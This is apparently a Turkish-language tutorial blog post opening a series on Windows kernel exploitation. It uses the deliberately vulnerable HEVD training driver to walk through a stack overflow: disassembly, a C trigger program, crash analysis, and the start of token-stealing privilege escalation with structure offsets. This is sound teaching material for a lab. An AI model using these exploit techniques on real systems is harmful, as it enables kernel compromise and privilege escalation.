---
title: Windows Çekirdeğini Çıtlatıyoruz - Yığın Taşması
categories: Bilgisayar
---

Selamlar. Bu yazı tahminimce en az 4, en fazla 7 yazıdan oluşan ve genel çerçeve olarak Windows çekirdeğinde "*exploit*"[^1] geliştirmekten bahseden bir yazı dizisinin ilk yazısı olacak inşallah. Yazı boyunca epey sevimli olan ve yabancı bir kardeşimizin hazırladığı [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) isimli sürücü üzerinden Windows çekirdeğini çitlemeyi hep birlikte öğrenmeye çalışacağız.

Bu yazılarda ön gereksinim olarak ihtiyacınız olan şeyler bir adet sanal makine, bu makineye bağlayabildiğiniz bir *Windbg* ve "*exploit*"leri yazmada rahat hissedebileceğiniz bir programlama dili olacak. Önceki yazılardan bir ikisinde Windows çekirdeğine nasıl hata ayıklayıcı bağlanır bundan bahsetmiştim (sanırım *Kancalama Sanatı* ile ilgili olan yazılardan birindeydi), dolayısıyla abesle iştigal olmaması açısından bu yazıda direkt olarak konuya giriş yapacağız. Fakat sakın üzülmeyin, zirâ mümkün mertebe dengeli bir şekilde, yani ne ifrata ne de tefrite bulaşmadan, doyurucu bir yazı dizisi hazırlamaya çalışacağım. Bu sayede bu teknik detaylarla aranızdan *Fight Club*'a girmeye hak kazananlar teker teker belli olacak hehe.

Bu kardeşimizin bize verdiği sürücüde, özel olarak Windows çekirdeğinde, genel olarak birçok çekirdekte bulunabilecek olan bazı zafiyetler mevcut. Bunların kimisi kullanıcı modunda da çalışan artık onluk sistemden on altılık sisteme sayı çevirme yapamayan dostlarımızın bile ağzına pelesenk olmuş zafiyetler, bazıları ise yapısı gereği sadece çekirdek modunda olan zafiyetler. Elimden geldiğince bu sürücüde öğrenilmesi amaçlanmış tüm zafiyetlerle ilgili bir blog yazısı yazacağım inşallah. Bu sayede minicik de olsa ülkemizde bu alanda hasret duyulan kendi dilimizde makale kazandırma alanında birazcık destek olmuş olacağız diye umuyorum.

Sanal makinenizi kurarken unutmamanızı rica ettiğim yalnızca bir şey var, o da hata ayıklayıcının sembolleri kolayca indirip kullanabilmesi için Windows'un sembol sunucusunu ortam değişkenlerinize eklemeniz. Bunun için *Bilgisayarım -> Özellikler -> Gelişmiş Sistem Ayarları -> Ortam Değişkenleri* adı altından aşağıdaki isme ve değere sahip bir ortam değişkeni eklemeniz yeterli olacaktır.

* `_NT_SYMBOL_PATH` - `SRV*C:\Semboller*https://msdl.microsoft.com/download/symbols`

Ayrıca, **HEVD** sürücüsünün sisteme yüklenebilmesi için komut satırından `bcdedit -set TESTSIGNING ON` komutunu çalıştırmayı lütfen unutmayın. Malum, Windows uzun bir süredir sürücüleri sisteme yükleyebilmek için sayısal olarak imzalanmış olmalarını istiyor. Test imzası modunda ise bu koruma özelliği devre dışı kaldığı için istediğimiz sürücüyü yükleyebiliyoruz. Ha, Windows bu özelliği koydu da süper güvenli mi oldu? Elbette hayır, şu an piyasada çekirdek modunda kod çalıştırmanıza izin veren zibilyon tane sayısal imzalı sürücü var. Bu sürücülerden herhangi birini kullanıp sayısal imza kontrolüne hiç takılmadan istediğiniz sürücüyü hafızaya yükleyebilirsiniz... Neyse... Test imzasına izin verdikten sonra **OSR**'nin çekirdek sürücüsü yükleme [aracını](https://www.osronline.com/article.cfm?article=157) kullanıp sürücüyü sisteme yükleyebilirsiniz.

Akabinde *Windbg*'yi bağlayıp sürücüyü yükledikten sonra *Windbg* üzerinden `ed nt!Kd_DEFAULT_MASK 8` komutunu çalıştırmayı lütfen unutmayın. Bu sayede sürücünün durum bilgisi olarak yazdıracağı mesajları *Windbg* üzerinden de okuyabileceğiz. Eğer her şeyiniz tamamsa, aşağıdaki gibi bir görüntüye ulaşmış olmanız gerekiyor.

![](/files/yuklendi.jpg)

Bu arada, esasen bu yazıyı en güncel haliyle olsun diye Windows 10 64 bit üzerinden anlatacaktım, fakat **SMEP**[^2] ve **SMAP**[^3] atlatma işin içine girince çok fazla detaya girmek gerekeceği için şimdilik bunu erteliyorum çünkü yazıya başladığımda sahip olduğum motivasyon ne kadar süre üzerimde kalır emin değilim...

{:.dikkat}
Yazının buradan sonraki kısımlarında bir adet Windows 7 64 bit işletim sistemi, bu işletim sistemine bağlanabilen bir *Windbg* hata ayıklayıcısı, ve yine bu Windows 7 üzerinde sisteme eklenmiş bir **HEVD** sürücüsünün olduğunu varsayıyorum. **HEVD** sürücüsünün derlenmiş halini yukarıda verdiğim *Github* sayfasındaki "*Releases*" kısmından indirebilir, ya da kendi bilgisayarınızda derleyebilirsiniz.

# Çekirdekte İlk Defa Yığın Taşırıyoruz

Şimdii, artık işin cavcaklı taraflarına ufak ufak başlayabiliriz. İlk konumuz yığın taşması, yani tarzanca söylersek "stack overflow". Hemen en başında şunu söyleyeyim, kullanıcı modunda yığın taşması ne ise, çekirdek modunda da üç aşağı, beş yukarı aynısı. Tek fark çalıştırdığımız "*shellcode*"[^4]. Bu yazı dizisinde anlatacağımız tüm zafiyetler için aynı yolu izlemeyi düşünüyorum. Öncelikle **IDA** ile zafiyetin olduğu yere bakacağız, sonra bu zafiyet olan yerin esas kodunu ve bu zafiyetin olmaması için ne yapmak gerektiğini kod üzerinden göreceğiz, en sonda ise bu zafiyet için kullanılabilecek olan "*exploit*"i geliştireceğiz. Sanıyorum girizgâhı yaptım, artık ufak ufak başlayalım bakalım...

## Zafiyetin Analizi

*IDA* aracılığıyla sürücünün giriş noktası olan `DriverEntry` fonksiyonuna baktığımızda klasik, sarih bir sürücü ilklenmesi ile karşılaşıyoruz. **Irp**("*I/O Request Packet*") işlerini halledecek olan fonksiyonlar `DRIVER_OBJECT` yapısına yazılıyor, sürücü ile kullanıcı modundan konuşabilmek için sembolik bir bağlantı oluşturuluyor vesaire... Bizim için önemli olan ise `IRP_MJ_DEVICE_CONTROL` numarasına sahip olan fonksiyon. Bu fonksiyon önceki yazılarımda bahsettiğim gibi sürücüye gelen özelleştirilmiş istekleri işlemekten sorumlu. Sürücüyü yazan dostumuz bu fonksiyon içerisinde her zafiyet için ayrı bir kontrol kodu tanımlamış. Biz öncelikle bu zafiyetler arasından yığın taşması ile ilgili olana bakacağız. Bu arada, sürücü ve kullanıcı modu iletişimi burada hiç anlatmıyorum, eğer bu kavramlara biraz yabancılık hissediyorsanız sizi önce [şu](/posts/suruculerde-ioctl-kullanimi) yazımıza davet edeyim. Bu zafiyet için belirlenmiş olan kontrol kodu ise `0x222003`(Kaynak kodda : `HACKSYS_EVD_IOCTL_STACK_OVERFLOW`) olarak seçilmiş. Aşağıda sürücüdeki kontrol kodlarınından hangisininin işleneceği belirlenirken kullanılan `switch` ifadesinin oluşturduğu şirin görüntüyü görüyorsunuz:

![](/files/sevimliswitch.jpg)

Yığın taşması durumuna sebep olacak olan `StackOverflowIoctlHandler` isimli fonksiyonumuz ise şöyle başlıyor:

```c
; NTSTATUS __fastcall StackOverflowIoctlHandler(PIRP Irp, PIO_STACK_LOCATION IrpSp)
StackOverflowIoctlHandler proc near   
                sub     rsp, 28h
                mov     rcx, [rdx+20h]  ; UserBuffer
                mov     edx, [rdx+10h]  ; Size
                mov     eax, STATUS_UNSUCCESSFUL
                test    rcx, rcx
                jz      short FAILED
                call    TriggerStackOverflow
FAILED:    
                add     rsp, 28h
                retn
```

Görüldüğü üzere fonksiyonumuz iki adet parametre[^5] alıyor. Bunlardan biri kullanılacak olan *Irp*, diğeri ise şu anda o *Irp* içerisinde kullanılan *yığın pozisyonu*. - Tekrar ediyorum, bu kavramların ne olduğuna dair bilgiyi sürücü geliştirme ile ilgi yazıda vermiştim, eğer kafa karışıklığı yaşıyorsanız o yazıya bakabilirsiniz.- 64 bit sistemlerde fonksiyon çağrıları "*fastcall*" mekanizmasına göre yapıldığı için birinci argümanımız **RCX** yazmacı ile, ikinci argümanımız ise **RDX** yazmacı ile gelecek demektir. Hulasa, bu minik fonksiyon kullanıcı modundan gönderilen veriyi ve bu verinin boyutunu Irp veri yapısı içerisinden alıp `TriggerStackOverflow` isimli fonksiyona gönderiyor. Bu fonksiyonun biraz kırparsam şöyle bir şey ile karşılaşıyoruz:

```assembly
mov     rsi, rdx ; rsi = Size
mov     rdi, rcx ; rdi = Buffer
...
...
mov     edx, 800h       ; Length
lea     r8d, [rbx+4]    ; Alignment
mov     rcx, rdi        ; Address
call    cs:__imp_ProbeForRead
mov     r8, rsi         ; Size
mov     rdx, rdi        ; Src
lea     rcx, [rsp+828h+Addr] ; Dst
call    memcpy
...
...
```

Şimdi dostlar, burada gördüğümz an "*AHA! EUREKA!*" diye çığırtkanlık yapmamız gereken şey nedir? Elbette şudur, burada ayrılmış bir hafıza alanı var, ve bu alana kullanıcı modundan gönderilen bir veri yazılıyor. Bu tür durumlarda kullanıcı modundan gelecek olan verinin boyutunun çekirdekte ayrılan yere uygun olup olmadığının kesinlikle doğrulanması gerekiyor fakat burada ne görüyoruz? -Aranızda bu yazıyı okuyan bir kuş var mı?- `memcpy` fonksiyonunu **Size** parametresini direkt olarak **RSI** yazmacından alıyor, bu yazmaç ise yukarıda gördüğünüz gibi kullanıcı modundan bize ulaşan bir değer. Bu ne demek? Kullanıcı tarafından belirlenebilen bir değişken, çekirdek modundaki bir kopyalama işlemi sırasında uzunluğu belirliyor... E haliyle bu durumda bu **Size** parametresi çekirdeğin bize ayırdığı alandan daha büyük bir şey olursa, çekirdekte bize ayrılan hafıza alanında bir taşma meydana gelecektir. Burada ek olarak tekrar dikkat etmeniz gereken diğer şey ise, `ProbeForRead` çağırılırken hafıza boyutu olarak `0x800` verilmiş olması. Bu da onluk sistemde **2048** yapar. Yani demek ki, çekirdeğin bize sunduğu hafıza alanı 2048 bayt uzunluğunda. Eee, geriye sadece daha büyük bir veriyi oraya yazmak, devamında ise geri dönüş değerinin üzerine yazabileceğimiz veri miktarını belirlemek kalıyor.

Tamam, şimdi bunu esas kod üzerinde de görelim hemen:

```c
__try {
	    //
        // Verilen adres kullanıcı modunda ve okunabiliyor mu kontrol et
        //
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));

#ifdef SECURE
        // Güvenli: Eğer kod bu şekilde olursa sorun yok demektir, çünkü
        // kullanılan boyut çekirdeğin bize verdiği alanın boyutu kadar. Yani
        // kullanıcı kafasına göre bu boyutu belirleyemiyor, haliyle
        // taşma olmuyor
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Stack Overflow\n");

        // Güvensiz: İşte klasik bir yığın taşması. Burada geliştirici
        // kullanıcıdan gelen boyut değişkenine güvenip hiçbir kontrol yapmıyor.
        // Yapmadığı için eğer kullanıcı bu değişkeni büyük bir şey gönderirse
        // bize ayrılan alan taşıyor...
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
```

Sanıyorum ek olarak açıklamaya gerek yok... Normal koşullarda yığın taşması ne ise, bu da tamamen aynısı. Bir yerde bir hafıza alanı var, siz buraya yazılan veriyi/boyutunu kontrol edebiliyorsunuz, çok fazla veri yazıyorsunuz ve böylece yığında saklanan geri dönüş adresinin üzerine yazıyorsunuz. Dolayısıyla uygulama `ret` komutunu çalıştırdığında sizin istediğiniz adreseten çalışmaya devam ediyor. Şimdi ufak ufak zafiyetin tetiklenmesi ve "*exploit*"in yazılması kısımlarına geçebiliriz.

## Zafiyetin Tetiklenmesi

Zafiyeti tetikleyebilmek için sürücüye bir istek göndermemiz gerekiyor. Bunun için farklı programlama dillerini kullanabilirsiniz, bu yazıda ise **C** kullanacağım. Sürücü geliştirme yazısında bu işlemlerin nasıl yapıldığından kısaca bahsetmiştik. Özetlememiz gerekirse:

* Sürücüye tutamak elde edilir
* Gönderilecek olan kontrol kodu belirlenir
* Gönderilecek olan veri belirlenir
* Veri sürücüye gönderilir

O halde şimdi şu yukarıdaki dört temel adımı yapan kodu görelim, sonrasında diğer zafiyetleri de bu temel kod üzerine inşa edeceğiz. Eğer önceki yazıları bir gözden geçirmiş iseniz, Windows'da çekirdek modundaki sürücülere haber salmak için [`DeviceIoControl`](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx) isimli bir fonksiyon kullanıyorduk. Şimdi de aynısını yapacağız, sisteme yüklediğimiz zafiyetli sürücüye bir tutamak elde edeceğiz, sonra da adı geçen fonksiyonu kullanarak verimizi gönderip masmavi bir ekran görmeye çalışacağız.

```c
#include "stdafx.h"
#include <Windows.h>
#include <future>

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

int main()
{
	BOOL Result             = FALSE;
	DWORD Retval            = 0;
	PUCHAR pBuffer          = NULL;
	const DWORD BufferSize  = 2048 + (8 * 3);
	HANDLE hDeviceHandle    = INVALID_HANDLE_VALUE;
	const WCHAR* DeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	printf("*** Cekirdegi Kitliyoruz - Yigin Tasmasi ***\n");

	//
	// Surucuye tutamak al
	//
	hDeviceHandle = CreateFile(
		DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if(hDeviceHandle == INVALID_HANDLE_VALUE)
	{
		printf("Surucuye tutamak alamiyoruz?!\n");
		goto RETURN;
	}

	printf("Hop, tutamak geldi : %p\n", hDeviceHandle);

	//
	// Veriyi hazırla
	// 
	pBuffer = (PUCHAR)VirtualAlloc(
		NULL,
		BufferSize,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if(!pBuffer)
	{
		printf("2018'de bos hafiza kalmamis?!\n");
		goto RETURN;
	}

	__stosb(pBuffer,                'A', 2048);
	__stosb(pBuffer + 2048,         'B', 8);
	__stosb(pBuffer + 2048 + 8,     'C', 8);
	__stosb(pBuffer + 2048 + 8 + 8, 'D', 8);

	Result = DeviceIoControl(
		hDeviceHandle,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		pBuffer,
		BufferSize,
		NULL,
		0,
		&Retval,
		NULL);

	printf("Evet, emaneti yolladik! Sonuc : %d\n", Result);

	//
	// CMD ÇALIŞTIR
	//

RETURN:

	if(pBuffer)
	{
		//VirtualFree(pBuffer, 0 , MEM_RELEASE);
		//pBuffer = NULL;
	}

	if(hDeviceHandle)
	{
		CloseHandle(hDeviceHandle);
	}

    return 0;
}
```

Şimdi bu kodu derleyip bahsi geçen sürücünün olduğu makinede çalıştırırsanız, eğer hata ayıklayıcınız bağlı ise hata ayıklayıcısına düşeceksiniz, eğer bağlı değilse mavi ekran hatası alacaksınız. Örneğin hata ayıklayıcımda durum şu şekilde:

![](/files/benimkindedurum.jpg)

`!analyze -v` komutu ile oluşan vukuatın analizini istediğimizde bize oldukça bilgilendirici bir çıktı veriyor.

```
1: kd> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

SYSTEM_SERVICE_EXCEPTION (3b)
An exception happened while executing a system service routine.
Arguments:
Arg1: 00000000c0000005, Exception code that caused the bugcheck
Arg2: fffff8800551b708, Address of the instruction which caused the bugcheck
Arg3: fffff880057a0dc0, Address of the context record for the exception that caused the bugcheck
Arg4: 0000000000000000, zero.

Debugging Details:
------------------

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - <Unable to get error code text>

FAULTING_IP: HEVD!TriggerStackOverflow+c8 [stackoverflow.c @ 101]
fffff880`0551b708 c3              ret

CONTEXT:  fffff880057a0dc0 -- (.cxr 0xfffff880057a0dc0)
rax=0000000000000000 rbx=4444444444444444 rcx=fffff880057a0fa0
rdx=0000077ffa88f060 rsi=0000000000000001 rdi=4242424242424242
rip=fffff8800551b708 rsp=fffff880057a17a8 rbp=fffffa8006617e80
 r8=0000000000000000  r9=0000000000000000 r10=4141414141414141
r11=fffff880057a17a0 r12=fffffa80041d3410 r13=0000000000000000
r14=0000000000000818 r15=fffffa80055b7801
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
HEVD!TriggerStackOverflow+0xc8:
fffff880`0551b708 c3              ret
Resetting default scope

LAST_CONTROL_TRANSFER:  from 4343434343434343 to fffff8800551b708

STACK_TEXT:  
fffff880`057a17a8 43434343`43434343 : 44444444`44444444 00000000`00000001 fffff880`057a17d8 00000000`00000018 : HEVD!TriggerStackOverflow+0xc8 [stackoverflow.c @ 101] 
fffff880`057a17b0 44444444`44444444 : 00000000`00000001 fffff880`057a17d8 00000000`00000018 fffff8a0`08a05150 : 0x43434343`43434343
fffff880`057a17b8 00000000`00000001 : fffff880`057a17d8 00000000`00000018 fffff8a0`08a05150 fffff880`0551c2a5 : 0x44444444`44444444
fffff880`057a17c0 fffff880`057a17d8 : 00000000`00000018 fffff8a0`08a05150 fffff880`0551c2a5 fffff880`0551cf60 : 0x1
```

Buradan `LAST_CONTROL_TRANSFER:  from 4343434343434343 to fffff8800551b708` kısmına bakarsanız, gönderiğimiz veriye yazdığımız 'C' harfleri, bizim kontrolu ele alabileceğimiz yer olarak gözüküyor ('C' = 0x43). Yani eğer orada `0x4343434343434343` değil de, içerisinde bizim çakallığı yapacak "*shellcode*"umuzun adresi olursa, kontrol bize geçer demektir. Peki tek denemede nasıl buldun burayı derseniz elbette ki tek denemede bulmadım, önceki yazılarda bahsettiğim gibi bir desen oluşturup veri olarak onu gönderdim, bu sayede kritik uzaklığın yerini belirledim. Bunu yapmasanız bile fonksiyonlarda kullanılan yığın boyutunu öğrenip, geri dönüş adresinin yazılacağı uzaklık değerini öğrenebilirsiniz, bu da bir seçenek. 

## "*Shellcode*" Yazımı

Tamam, şu anda kod çalıştırabileceğimiz bir duruma geldik. Peki ne çalıştıracağız? Mesela hatırlayın, kullanıcı modunda ne yapıyorduk? İşte hesap makinesi çalıştırıyorduk, uzaktan bağlantıya izin veren bir arka kapı çalıştırıyorduk. Ama şimdi çekirdek modundayız, yani tüm kalkanlar devrede hehe. O halde yetkimizi yükseltip yönetici olalım bakalım!

Bunun için öncelikle birazcık Windows mimarisinden bahsetmemiz gerekiyor. Tamam, yetki yükselteceğiz de nasıl? Şimdi, öncelikle yetki yükselterek yapmak istediğimiz şey, "*exploit*" olarak çalışan işlemin(veya bir başkasının) yetkilerinin sistem yetki seviyesine çekilmesi sağlamak. Windows işletim sisteminde işlemlerin yetki durumunu tanımlayan "**Token**" adı verilen bir nesne var -unutmayın, Windows çekirdeğinde hemen hemen her şey bir nesnedir-. Normal şartlar altında bizim kullanıcı modundan çalıştırılan işlemimiz, o anki kullanıcının sahip olduğu haklara göre çalıştırılıyor. Biz, gidip bir sistem işleminden onun yetkilerini tanımlayan "*Token*" nesnesini alıp, kendi işlemizin yetkilerini tanımlayan "*Token*" nesnesinin yerine koyacağız. Bu sayede sistem işleminde olan yetkiler bizim işlemize de geçmiş olacak. Oldukça kolay bir işlem, yapmak için genel hatlarıyla dört aşamayı gerçekleştirmemiz gerekiyor:

1. Sistem işleminin veri yapısını bul
2. Bu işlemin "Token" bilgisini al
3. Alınan "Token" bilgisini hedef işlemin "Token" alanına koy
4. Sistemi çökmekten kurtar!

### Biraz Windows Mimarisi

Öncelikle işletim sistemindeki işlemleri gezebilmemiz gerekiyor. Bunların hepsini bir "*shellcode*" içerisinden yapmalıyız. Windows işletim sistemindeki hemen hemen her işlem bir `EPROCESS`(Executive Process) veri yapısı ile tanımlanır. Bu yapı içerisinde o işleme ait işlemciklere, hafıza alanlarına ve işlem ile ilgili diğer tüm bilgilere ulaşabilirsiniz. Sistemdeki işlemleri gezebilmemiz için öncelikle bu işlemlerin tutulduğu herhangi bir yere erişim sağlamamız gerekiyor. Bunun için öncelikle işletim sistemindeki **KPCR** veri yapısına başvuracağız.

#### KPCR (Kernel Processor Control Region), KPRCB (Kernel Processor Control Block) ve EPROCESS
**KPCR**, Windows işletim sisteminde, sistemde bulunan her çekirdek için bir adet bulunan kritik veri yapılarından biridir. İşletim sistemi bu veri yapısında işlemcinin kesme işleme tablosu(*Interrupt Descriptor Table*), küresel tanımlayıcı(*Global Descriptor Table*) tablosu, geçerli Irql seviyesi, sistemin sürüm bilgisi gibi kritik verileri barındırır. Bu veri yapısı, kolayca erişebilmek için, 64 bit Windows işletim sisteminde her zaman `gs` segment göstericisi ile gösterilen alanın ilk baytında bulunur. (32 bit sistemlerde ise `fs` segment göstericisi ile bu veri yapısına ulaşabilirsiniz.) Yani `mov rax, gs:[0]` gibi bir işlem yaptığımızda bu veri yapısına ulaşabiliriz. İşlem listesine ulaşabilmek için şöyle bir yol izleyeceğiz : `KPCR.Prcb -> KPRCB.CurrentThread -> KTHREAD.ApcState -> KAPC_STATE.Process`. Bu yolu izlediğimizde şu anda çalıştırılmakta olan işlemin veri yapısına ulaşacağız demektir. Bilahare bu veri yapılarının hepsi birbirine bağlandığı için tüm işlemler arasından gezebiliyor olacağız. 

```
0: kd> dt _KPCR
ntdll!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
   +0x008 TssBase          : Ptr64 _KTSS64
   +0x010 UserRsp          : Uint8B
   +0x018 Self             : Ptr64 _KPCR
   +0x020 CurrentPrcb      : Ptr64 _KPRCB
   +0x028 LockArray        : Ptr64 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : Ptr64 Void
   +0x038 IdtBase          : Ptr64 _KIDTENTRY64
   +0x040 Unused           : [2] Uint8B
   +0x050 Irql             : UChar
   +0x051 SecondLevelCacheAssociativity : UChar
   +0x052 ObsoleteNumber   : UChar
   +0x053 Fill0            : UChar
   +0x054 Unused0          : [3] Uint4B
   +0x060 MajorVersion     : Uint2B
   +0x062 MinorVersion     : Uint2B
   +0x064 StallScaleFactor : Uint4B
   +0x068 Unused1          : [3] Ptr64 Void
   +0x080 KernelReserved   : [15] Uint4B
   +0x0bc SecondLevelCacheSize : Uint4B
   +0x0c0 HalReserved      : [16] Uint4B
   +0x100 Unused2          : Uint4B
   +0x108 KdVersionBlock   : Ptr64 Void
   +0x110 Unused3          : Ptr64 Void
   +0x118 PcrAlign1        : [24] Uint4B
   +0x180 Prcb             : _KPRCB       ----> Dikkat
```

Windows çekirdeği ile ilgilenen biriyseniz, bu veri yapısındaki her girdi incelemeniz için sizi bekliyor haberiniz olsun :) Fakat şimdilik o çekici detayları geçelim ve işlem listesine ulaşmaya odaklanalım. Burada en son eleman olan **Prcb** elamanı bizim aradığımız arkadaş, dikkat edin `0x180` uzaklığında bulunuyor. **Prcb**, yine Windows işletim sisteminde geçerli işlemcinin kullandığı oldukça kritik verileri barındıran bir veri yapısı. Bu veri yapısının da her elemanı her Windows çekirdeği meraklısı için günlerce incelenebilecek cinsten, haberiniz olsun... Neyse, devamında **Prcb** içerisinde `0x8` uzaklığında bulunan `CurrentThread` alanı ile şu anda çalıştırılan işlemciğin(Thread) veri yapısına ulaşacağız.

```
0: kd> dt _KPRCB
ntdll!_KPRCB
   +0x000 MxCsr            : Uint4B
   +0x004 LegacyNumber     : UChar
   +0x005 ReservedMustBeZero : UChar
   +0x006 InterruptRequest : UChar
   +0x007 IdleHalt         : UChar
   +0x008 CurrentThread    : Ptr64 _KTHREAD  ----> Dikkat
   +0x010 NextThread       : Ptr64 _KTHREAD
   +0x018 IdleThread       : Ptr64 _KTHREAD
   +0x020 NestingLevel     : UChar
   +0x021 PrcbPad00        : [3] UChar
   +0x024 Number           : Uint4B
   +0x028 RspBase          : Uint8B
   +0x030 PrcbLock         : Uint8B
   +0x038 PrcbPad01        : Uint8B
   ...
   ...
```

Esasında, **Prcb** alanı, **Pcr** alanının içerisinde olduğu için `gs` segment göstericisinin gösterdiği alanda `0x180 + 0x8` uzaklığına gidersek şu anda çalıştırılan işlemciğin veri yapısına ulaşacağız demektir. Burada bizi `KTHREAD`(Kernel Thread) veri yapısı karşılayacak. Bu veri yapısı esasen `ETHREAD`(Executive Thread) denilen başka bir veri yapısının en başında bulunan bir veri yapısı. Windows çekirdeğinde bir çekirdek (kernel) bir de yönetim (executive) dedikleri iki ana katman vardır. Bunlardan ilki daha da alt seviyedeyken, ikinicisi biraz daha üstte bir katmandır, aklınızda bulunsun.

`KTHREAD` veri yapısına geldikten sonra bu veri yapısının içerisinden bu işlemciği kapsayan işleme ulaşmamız gerekiyor. Bunun için öncelikle `ApcState` (uzaklığı `0x50`) alanına ulaşacağız, devamında ise `KAPC_STATE` veri yapısı içerisinden `EPROCESS` veri yapısını alacağız. Bakınız:

```
0: kd> dt nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 CycleTime        : Uint8B
   +0x020 QuantumTarget    : Uint8B
   +0x028 InitialStack     : Ptr64 Void
   +0x030 StackLimit       : Ptr64 Void
   +0x038 KernelStack      : Ptr64 Void
   +0x040 ThreadLock       : Uint8B
   ...
   ...
   +0x050 ApcState         : _KAPC_STATE ----> Dikkat
   ...
   ...
   +0x330 OtherOperationCount : Int8B
   +0x338 ReadTransferCount : Int8B
   +0x340 WriteTransferCount : Int8B
   +0x348 OtherTransferCount : Int8B
   +0x350 ThreadCounters   : Ptr64 _KTHREAD_COUNTERS
   +0x358 StateSaveArea    : Ptr64 _XSAVE_FORMAT
   +0x360 XStateSave       : Ptr64 _XSTATE_SAVE

0: kd> dt nt!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY
   +0x020 Process          : Ptr64 _KPROCESS --> Dikkat
   +0x028 KernelApcInProgress : UChar
   +0x029 KernelApcPending : UChar
   +0x02a UserApcPending   : UChar

```

Yine burada `0x50 + 0x20` yaparsak toplamda `0x70` uzaklığına gittiğimizde şimdiki işlemin `KPROCESS` veri yapısına ulaşacağız demektir. Ki, bu veri yapısı da söylediğimiz gibi `EPROCESS` veri yapısının en başında bulunan bir veri yapısı, dolayısıyla aynı zamanda işlemin `EPROCESS` yapısına da ulaşmış oluyoruz demektir bu. 

Araya ufak bir bilgi ekleyeyim, Windows çekirdeğinin içerisinde gezdikçe bu tür taklaları nasıl atabileceğinizi işletim sisteminin kendinden de öğrenebiliyorsunuz. Örneğin biz burada şu anda çalışan işlemin veri yapısına ulaşmak istedik değil mi? Mesela eğer sürücü geliştirmekle uğraştıysanız bilirsiniz ki `PsGetCurrentProcess` isimli fonksiyon size şu anda çalışmakta olan işlemin veri yapısını döndürür. Bu fonksiyonun nasıl çalıştığına bakarak mevcut işlemin veri yapısına nasıl ulaşabileceğinizi öğrenebilirsiniz, bakınız:

```assembly
3: kd> u nt!PsGetCurrentProcess
nt!PsGetCurrentProcess:
    fffff800`02ad8890 65488b042588010000 mov     rax,qword ptr gs:[188h]
    fffff800`02ad8899 488b4070           mov     rax,qword ptr [rax+70h]
```

Görüldüğü üzere, tam olarak bizim yapmayı planladığımız şeyi yapıyor (Aslında ben bu fonksiyonun nasıl çalıştığına bakıp ona göre "*shellcode*"u yazıyorum ama şimdi orayı karıştırmayın, hehe). O halde bu fonksiyonun bu ilk iki satırını (ki zaten toplam 3 satır) kullanabiliriz ileride. Burada aklıma gelmişken söyleyeyim, unutmamanız gereken şey, bu veri yapılarının alanlarının uzunlukları sürümden sürüme değişebiliyor. O nedenle Windows 7'de çalışan "*shellcode*" diğer sürümlerde çalışmayabilir. Siz hangi işletim sistemi için "*exploit*"i geliştiriyorsanız, o sistemdeki uzaklık değerlerini kullanmalısınız.

Şimdi ise geldik işin cavcaklı kısmına. `EPROCESS` veri yapısında bu "*shellcode*"u yazarken ihtiyacımız olan üç adet şey var. Bunlar sırasıyla **UniqueProcessId**, **ActiveProcessLinks** ve **Token** elemanları. İsimleri zaten az çok ne olduklarını anlatıyor.

```
0: kd> dt _EPROCESS
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x160 ProcessLock      : _EX_PUSH_LOCK
   +0x168 CreateTime       : _LARGE_INTEGER
   +0x170 ExitTime         : _LARGE_INTEGER
   +0x178 RundownProtect   : _EX_RUNDOWN_REF
   +0x180 UniqueProcessId  : Ptr64 Void       ----> İlk dostumuz (0x180)
   +0x188 ActiveProcessLinks : _LIST_ENTRY    ----> İkinci dostumuz (0x188)
   ...
   ...
   +0x208 Token            : _EX_FAST_REF     ----> Üçüncü dostumuz (0x208)
   +0x210 WorkingSetPage   : Uint8B
   +0x218 AddressCreationLock : _EX_PUSH_LOCK
   ...
   ...
```

`ActiveProcessLinks` alanı gördüğünz gibi bir `LIST_ENTRY` veri yapısı. Bu ise iyi haber demek, lakin bu eleman sistemde bulunan tüm işlemleri birbirine bağlıyor. Bu sayede işlemler arasında hızlıca gezebiliyoruz. Burada bilmemiz gereken şeylerden biri "*Token*" bilgisini alacağımız işlemin belirteç değeri. Ki, o da çok uzun bir zamandır **4** değeri ile belirtiliyor. Bu durumda işlem listesini gezerek `UniqueProcessId` alanı **4** olan bir veri yapısını arayacağız demektir. Üstteki çıktıda normalde `Token` elemanı `TOKEN` veri tipi ile tanımlanıyor. Fakat burada 64 bit Windows'a özgü bir takla atılmış ona da kısaca değinelim. Burada `Token` elemanı `EX_FAST_REF` veri yapısı ile tanımlanmış. Bu veri yapısı şu şekilde:

```
3: kd> dt _EX_FAST_REF 
ntdll!_EX_FAST_REF
